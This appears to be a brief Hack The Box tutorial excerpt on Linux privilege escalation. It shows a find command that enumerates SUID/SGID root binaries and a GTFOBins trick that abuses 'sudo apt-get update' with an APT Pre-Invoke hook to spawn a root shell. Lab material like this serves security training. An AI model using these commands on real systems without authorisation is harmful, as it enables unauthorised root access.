
```shell
3kjS@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```shell
3kjS@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null 

-rwsr-sr-x 1 root root 85832 Nov 30 2017 /usr/lib/snapd/snap-confine
```
## GTFOBins

```shell
3kjS@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh 

# id 
uid=0(root) gid=0(root) groups=0(root)
```
